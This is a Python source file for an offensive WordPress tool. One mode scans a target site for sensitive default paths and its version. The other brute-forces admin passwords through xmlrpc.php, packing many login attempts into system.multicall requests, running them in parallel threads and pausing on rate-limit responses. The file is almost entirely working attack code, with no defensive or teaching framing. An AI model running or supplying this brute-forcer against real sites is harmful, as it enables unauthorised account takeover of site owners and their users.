import requests, time, sys, os, re, urllib3, threading, concurrent.futures
import xml.etree.ElementTree as ET
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

# auto-completion
from prompt_toolkit import prompt
from prompt_toolkit.completion import PathCompleter
from prompt_toolkit.formatted_text import HTML

# colorama
from colorama import init, Fore, Style


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init() # Init colorama

M = Fore.MAGENTA
W = Fore.WHITE
B = Fore.CYAN
R = Fore.RED
Y = Fore.YELLOW
G = Fore.GREEN

banner = f'''{M}
             _         _   _      __        ______  
            | |    ___| |_( )___  \ \      / /  _ \ 
            | |   / _ \ __|// __|  \ \ /\ / /| |_) |
            | |__|  __/ |_  \__ \   \ V  V / |  __/ 
            |_____\___|\__| |___/    \_/\_/  |_|  
                                      {Y}<{B}raph{W}aelt{R}hief{Y}>{G}
                                      
'''


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def exitapp():
    print(f"\n{R}Closing ...")
    sys.exit(1)   


def input_with_autocomplete(prompt_text):
    """
    Prompt the user for input with auto-completion for file paths.
    Supports ANSI-style color formatting using HTML.
    """
    completer = PathCompleter(expanduser=True)
    try:
        return prompt(HTML(prompt_text), completer=completer)
    except KeyboardInterrupt:
        print(f"\n\n{M}[!] {R}KeyboardInterrupt...\n")
        return None   





def main():
    try:
        clear_screen()
        print(banner)
        
        print(f" {Y}0{G}. Exit")
        print(f" {Y}1{G}. Scan interesting default paths and files")
        print(f" {Y}2{G}. xmlrpc bruteforce\n")
            
        choice = input(f"{Y}Select 0 to 2 : {G}")

        if choice == "0":
            exitapp()
            
            
            
        elif choice == "1": 
            clear_screen()
            print(banner)
            url = input(f"{M}[+] {G}Enter the target WordPress site URL (http://example.com) : ")
            # Append slash at the end if not present
            if not url.endswith("/"):
                url += "/"

            # List of common WordPress sensitive directories and files to check (###### add more here if needed ######)
            paths_to_check = [
                "wp-admin/",
                "wp-login.php",
                "wp-content/",
                "wp-content/uploads/",
                "wp-json/wp/v2/users",
                "wp-json/wp/v2/posts",
                "wp-includes/",
                "wp-config.php",
                "wp-cron.php",
                "readme.html",
                "robots.txt",
                "sitemap_index.xml",
                "wp-sitemap.xml",
                "license.txt",
                "xmlrpc.php"
            ]
            detect_wordpress_version(url)
            check_wordpress_paths(url, paths_to_check)
      

        elif choice == "2": 
            clear_screen()
            print(banner)
            bruteforce()

    except KeyboardInterrupt:
        print(f"\n\n{M}[!] {R}KeyboardInterrupt...\n")
        sys.exit(0)



def check_wordpress_paths(url, paths):
    print("")
    for path in paths:
        full_url = url + path
        try:
            # GET request
            response = requests.get(full_url)

            # Get status code and response
            print(f"{M}[!] {G}Checking : {Y}{full_url}")
            print(f"{M}[+] {G}Status Code : {Y}{response.status_code}{G}")
            
            if response.status_code == 200:
                print(f"  - Accessible (200 OK)\n")
            elif response.status_code == 403:
                print(f"  - Forbidden (403) - Exists but not accessible\n")
            elif response.status_code == 405:
                if "XML-RPC server accepts POST requests only" in response.text:
                    print(f"  - Method Not Allowed (405) - Exist with other request than GET\n")
                else:
                    print(f"  - Method Not Allowed (405) - Not accessible (if xmlrpc.php)\n")
            elif response.status_code == 404:
                print(f"  - Not Found (404) - Does not exist\n")
            elif response.status_code == 301 or response.status_code == 302:
                print(f"  - Redirected (301/302) - Potential sensitive location\n")
            else:
                print(f"  - Other status : {response.status_code}\n")
        except requests.RequestException as e:
            print(f"{M}[!] {R}Error occurred for {full_url}: {e}\n")


def detect_wordpress_version(url):
    try:
        response = requests.get(url, timeout=30, verify=False)
        if response.status_code != 200:
            print(f"{M}[!] {R}Error : Unable to access the site")
            return None

        soup = BeautifulSoup(response.text, 'html.parser')

        # Search for "generator" meta tag
        meta_generator = soup.find('meta', {'name': 'generator'})
        if meta_generator:
            generator_content = meta_generator.get('content', '')
            if "WordPress" in generator_content:
                print(f"{G}[+] WordPress version : {R}{generator_content}")
                return None
        
        print(f"{M}[-] {G}WordPress version : {Y}unknow ...")
        return None

    except requests.RequestException as e:
        print(f"{M}[!] {R}An unexpected request error occurred while detecting wordpress version : {e}")
        return None




# Bruteforce xmlrpc
def create_multicall_payload(username, password_chunk):
    try:
        """Crée le payload XML pour un chunk de mots de passe."""
        multicall_payload = "<?xml version='1.0' encoding='UTF-8'?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>"

        for password in password_chunk:
            multicall_payload += f"""
                <value>
                    <struct>
                        <member><name>methodName</name><value>wp.getUsersBlogs</value></member>
                        <member><name>params</name>
                            <value><array><data>
                                <value><string>{username}</string></value>
                                <value><string>{password}</string></value>
                            </data></array></value>
                        </member>
                    </struct>
                </value>"""

        multicall_payload += "</data></array></value></param></params></methodCall>"
        return multicall_payload
    except KeyboardInterrupt:
        print(f"\n\n{M}[!] {R}KeyboardInterrupt...\n")
        sys.exit(0)


def parse_response_for_passwords(response_text, password_chunk):
    """Get XML format with huge amount of passwords test"""
    try:
        root = ET.fromstring(response_text)
        responses = root.findall(".//value/array/data/value")

        for i, response in enumerate(responses):
            # "isAdmin" ?
            is_admin = response.find(".//member[name='isAdmin']/value/boolean")
            if is_admin is not None and is_admin.text == "1":
                # Parse true password
                return password_chunk[i]

        return None 
    except ET.ParseError as e:
        print(f"Erreur lors de l'analyse XML : {e}")
        return None
        
        
def send_request(username, password_chunk, url, headers, stop_event):
    try:
        if stop_event.is_set():
            return None

        payload = create_multicall_payload(username, password_chunk)
        try:
            # HTTP request POST
            response = requests.post(url, data=payload, headers=headers, timeout=30, verify=False)
            if stop_event.is_set():
                return None

            if response.status_code == 200:
                # XML parse_response_for_passwords
                found_password = parse_response_for_passwords(response.text, password_chunk)
                return {
                    "status_code": response.status_code,
                    "response_size": len(response.content),
                    "found_password": found_password
                }

            return {
                "status_code": response.status_code,
                "response_size": len(response.content),
                "found_password": None
            }

        except requests.RequestException as e:
            print(f"Erreur lors de l'envoi de la requête : {e}")
            return {"status_code": None, "response_size": 0, "found_password": None}


    except KeyboardInterrupt:
        print(f"\n\n{M}[!] {R}KeyboardInterrupt...\n")
        sys.exit(0)


def display_progress(current, total, status_code, response_size):
    try:
        """Display a progress bar with details"""
        progress = (current / total) * 100
        print(
            f"\r{M}[!] {G}Progress : [{Y}{progress:.2f}%{G}] | Tested : {M}{current}{G}/{R}{total} {G}| "
            f"Last Status : {Y}{status_code} {G}| Last Size : {Y}{response_size} {G}bytes", 
            end=""
        )
    except KeyboardInterrupt:
        print(f"\n\n{M}[!] {R}KeyboardInterrupt...\n")
        sys.exit(0)


def bruteforce():
    try:
        # User inputs
        username = input(f"{M}[+] {G}Enter the username : {Y}")
        password_file_path = input_with_autocomplete(
            '<ansimagenta>[+] </ansimagenta><ansigreen>Enter the password file path : </ansigreen>'
        )
        url = input(f"{M}[+] {G}Enter the target URL (http://example.com/xmlrpc.php) : {Y}")

        try:
            print(f"{M}[!] {Y}Multicall will only work against WP < 4.4! Use 1 password request if the target is WP < 4.4")
            num_passwords_per_request = int(input(f"{M}[+] {G}Number of passwords per request : {Y}"))
        except ValueError:
            print(f"{M}[!] {R}Invalid input, using the default value of 1 password per request.")
            num_passwords_per_request = 1

        try:
            timerz = float(input(f"{M}[+] {G}Delay between each batch of requests (in seconds) : {Y}"))
        except ValueError:
            print(f"{M}[!] {R}The delay must be a number. Using the default value of 0.5 seconds.")
            timerz = 0.5

        try:
            long_pause_duration = float(input(f"{M}[+] {G}Duration of the pause in case of code 429 (in seconds) : {Y}"))
        except ValueError:
            print(f"{M}[!] {R}Invalid input, using the default value of 60 seconds.")
            long_pause_duration = 60

        use_threads = input(f"{M}[+] {G}Use multi-threading (y/n) : {Y}").strip().lower()

        # Threads
        if use_threads == 'y' or use_threads == 'yes':
            try:
                num_threads = int(input(f"{M}[+] {G}Number of threads to use : {Y}"))
            except ValueError:
                print(f"{M}[!] {R}Invalid input, using the default value of 10 threads.")
                num_threads = 10
        else:
            num_threads = 1

        print("")
        
        headers = {"Content-Type": "text/xml"}

        # Password loading
        with open(password_file_path, "r", encoding="ISO-8859-1") as file:
            passwords = [line.strip() for line in file]
        total_passwords = len(passwords)

        # Passwords chunks
        password_chunks = [passwords[i:i + num_passwords_per_request]
                           for i in range(0, total_passwords, num_passwords_per_request)]

        last_status_code = None
        last_response_size = None
        stop_event = threading.Event()
        lock = threading.Lock()  # To synchronize sleep between threads
        batch_counter = 0  # To track how many batches were processed

        found_password = None

        def worker(chunk):
            """Worker function for sending requests."""
            nonlocal found_password, last_status_code, last_response_size, batch_counter
            if stop_event.is_set():
                return

            result = send_request(username, chunk, url, headers, stop_event)

            with lock:  # Synchronize shared variables
                if result:
                    # Handle HTTP 429
                    if result["status_code"] == 429:
                        print(f"\n[!] Server returned 429. Pausing for {long_pause_duration} seconds...")
                        time.sleep(long_pause_duration)
                        return

                    # Check if a password is found
                    if result["found_password"]:
                        found_password = result["found_password"]
                        stop_event.set()
                        return

                    # Update status and size
                    if result["status_code"] != last_status_code or result["response_size"] != last_response_size:
                        last_status_code = result["status_code"]
                        last_response_size = result["response_size"]

                    display_progress(batch_counter + 1, len(password_chunks), last_status_code, last_response_size)

                batch_counter += 1

        # Thread Pool
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            for i in range(0, len(password_chunks), num_threads):
                # Launch up to num_threads tasks
                chunk_group = password_chunks[i:i + num_threads]
                executor.map(worker, chunk_group)

                # Wait between batches
                if not stop_event.is_set():
                    time.sleep(timerz)

        # Final result
        if found_password:
            print(f"\n[+] Valid password found : {M}{username}{G}:{R}{found_password}")
        else:
            print(f"\n{R}[-] No valid password found.")

    except FileNotFoundError:
        print(f"{M}[!] {R}Error: Password file not found. Check the path.")
    except Exception as e:
        print(f"{M}[!] {R}An unexpected error occurred: {e}")
    except KeyboardInterrupt:
        print(f"\n\n{M}[!] {R}KeyboardInterrupt...\n")
        sys.exit(0)

    
    
if __name__ == "__main__":
    main()
    